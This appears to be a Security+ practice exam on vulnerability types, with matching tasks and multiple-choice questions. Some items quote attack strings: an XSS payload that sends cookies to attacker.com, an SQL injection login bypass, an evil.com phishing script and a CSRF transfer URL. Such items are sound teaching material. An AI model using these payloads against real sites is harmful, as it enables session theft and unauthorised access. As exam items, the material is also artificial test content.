# CompTIA Security+ (SY0-701) Practice Exam

## Domain 2.0: Threats, Vulnerabilities, and Mitigations

### Objective 2.3: Given a scenario, analyze vulnerabilities

### Section 1: Performance-Based Questions (PBQs)

#### PBQ 1: Application and Web Vulnerability Mapping

**Scenario:**
As a security analyst, you are reviewing a recent penetration test report for your company's custom e-commerce web application. The testers have identified several severe vulnerabilities. 

**Task:**
Match the **Penetration Test Finding Description** to the correct **Vulnerability Type**. 

**Vulnerability Types:**
* SQL Injection (SQLi)
* Cross-Site Scripting (XSS)
* Cross-Site Request Forgery (CSRF)
* Buffer Overflow
* Race Condition (Time-of-Check to Time-of-Use)
* Memory Leak

**Findings:**

| Finding ID | Penetration Test Finding Description | Vulnerability Type | 
| :--- | :--- | :--- | 
| **Finding 1** | The tester found that by opening two browser sessions and clicking the "Apply \$50 Promo Code" button simultaneously on both, the server credited the account \$100 before the database could lock the transaction state. | |
| **Finding 2** | A tester entered `<script>document.location='http://attacker.com/?cookie='+document.cookie</script>` into a product review comment. When the admin viewed the review, their session token was stolen. | |
| **Finding 3** | The application crashes and requires a manual restart every 48 hours. Monitoring tools show the application's RAM usage steadily increases over time without ever releasing unused resources back to the OS. | |
| **Finding 4** | By crafting an HTML page with a hidden form pointing to `https://ecommerce.local/user/delete_account` and tricking an authenticated admin into visiting the page, the tester forced the admin's browser to silently delete their own account. | |
| **Finding 5** | The tester sent an authentication request with an abnormally long username (over 2,000 "A" characters) to a legacy C++ billing module. This crashed the module and allowed the tester to overwrite the instruction pointer in memory. | |
| **Finding 6** | The tester entered `' OR 1=1; --` into the login page's password field, which bypassed the authentication check and logged them in as the first user in the database table. | |

#### PBQ 2: Cloud and Infrastructure Audit Matrix

**Scenario:**
You have been hired to audit a hybrid infrastructure environment containing legacy on-premises servers, IoT devices, Docker containers, and AWS cloud resources. 

**Task:**
Review the following audit observations. Identify the **Vulnerability Category** and select the most appropriate **Remediation Action**.

**Vulnerability Categories:**
* Default Credentials
* End-of-Life (EOL) / Unsupported Product
* Misconfigured Cloud Bucket
* Container Breakout
* Weak API Permissions

**Remediation Actions:**
* A. Upgrade the host operating system to a supported version and apply current vendor patches.
* B. Enforce the Principle of Least Privilege (PoLP) on IAM roles and rotate access keys.
* C. Change the access control list (ACL) to block public access and enforce authenticated IAM policies.
* D. Change factory administrative passwords upon initial device deployment.
* E. Run workloads as non-root users, use Seccomp profiles, and prevent mounting the host's `/var/run/docker.sock`.

**Audit Matrix:**

| Observation | Vulnerability Category | Remediation Action (A-E) |
| :--- | :--- | :--- |
| **1.** A newly installed physical security camera system is accessible via SSH over the internal network using the username `admin` and password `12345`. | | |
| **2.** A developer created an AWS S3 storage container for internal company backups. An automated scanner alerted that the container's policy is set to allow `Everyone` to perform `s3:GetObject` and `s3:ListBucket`. | | |
| **3.** A critical financial database is running on a server operating system that the vendor stopped providing security patches for three years ago. | | |
| **4.** An attacker exploited a vulnerable web app running inside a Docker instance. By abusing overly permissive capabilities, the attacker escaped the isolated namespace and gained root command execution on the underlying Linux host. | | |
| **5.** An application requires an access token to read a single cloud database table. The developer provisioned an access key that grants `AdministratorAccess` (*.*) to the entire cloud account "just in case it needs it later." | | |

### Section 2: Scenario-Based Multiple-Choice Questions (MCQs)

#### Question 1
A security operations center (SOC) detects an adversary interacting with an enterprise web application. The web server logs show the following string was appended to the application's URL:
`http://www.example.com/search?q=<script>alert('Session Expired. Please Re-login at http://evil.com');</script>`

Which of the following vulnerabilities is the attacker attempting to exploit?
* A. SQL Injection (SQLi)
* B. Cross-Site Scripting (XSS)
* C. Race Condition
* D. Cross-Site Request Forgery (CSRF)

#### Question 2
A threat actor discovers that a company's customer service portal does not validate the size of data inputs. By sending an excessively large chunk of data to the login field, the actor crashes the service and writes malicious instructions into adjacent memory locations. 

This scenario best describes which of the following vulnerabilities?
* A. Buffer overflow
* B. Memory leak
* C. Container breakout
* D. Injection flaw

#### Question 3
An IT administrator is auditing the organization's cloud environment and notices that an API key used by a third-party vendor to upload monthly reports has permissions to delete virtual machines, modify network routing tables, and access sensitive customer databases. 

Which vulnerability does this represent?
* A. Default credentials
* B. End-of-Life (EOL) misconfiguration
* C. Weak API permissions
* D. Misconfigured cloud buckets

#### Question 4
A manufacturing company operates several robotic assembly lines controlled by legacy supervisory control and data acquisition (SCADA) systems. The vendor went out of business five years ago, and the software can no longer receive updates or security patches.

Which of the following vulnerabilities does this system present to the enterprise?
* A. Default credentials
* B. Unpatched systems and EOL
* C. Memory leaks
* D. Race conditions

#### Question 5
During a code review, a security analyst notices that a multithreaded banking application checks a user's account balance, and then separately deducts funds during a transfer. The analyst realizes that if two transfer requests happen at the exact same millisecond, the application might check the balance for both before deducting either, allowing the user to transfer more money than they actually have.

What type of vulnerability is the analyst observing?
* A. Memory leak
* B. Buffer overflow
* C. Race condition
* D. CSRF

#### Question 6
An attacker embeds an invisible `<iframe>` on an entertainment forum. When an authenticated user of `banking.local` visits the entertainment forum, the hidden frame automatically sends a request to `banking.local/transfer?amount=5000&to=AttackerAcct`. Because the user's browser automatically attaches their active session cookie, the bank processes the transfer.

Which of the following vulnerabilities makes this attack possible?
* A. SQL Injection (SQLi)
* B. Cross-Site Request Forgery (CSRF)
* C. Container breakout
* D. Cross-Site Scripting (XSS)

#### Question 7
A cloud architect is reviewing the security of a microservices environment running in Kubernetes. The architect discovers that if a pod is compromised, the attacker can leverage a misconfiguration in the kernel namespaces to access the hypervisor and interact with other, completely unrelated tenant pods running on the same physical hardware.

Which of the following vulnerabilities is the architect concerned about?
* A. Container breakout
* B. Weak API permissions
* C. Memory leak
* D. SQL Injection (SQLi)

#### Question 8
After analyzing network logs, a security engineer notices an unusually high volume of traffic originating from a newly deployed smart thermostat on the executive floor. The engineer attempts to access the device's web management interface and successfully logs in using `admin` as the username and `password` as the password. 

Which vulnerability allowed the engineer (and potentially attackers) to access the device?
* A. Default credentials
* B. End-of-Life (EOL) products
* C. Misconfigured cloud buckets
* D. Cross-Site Request Forgery (CSRF)
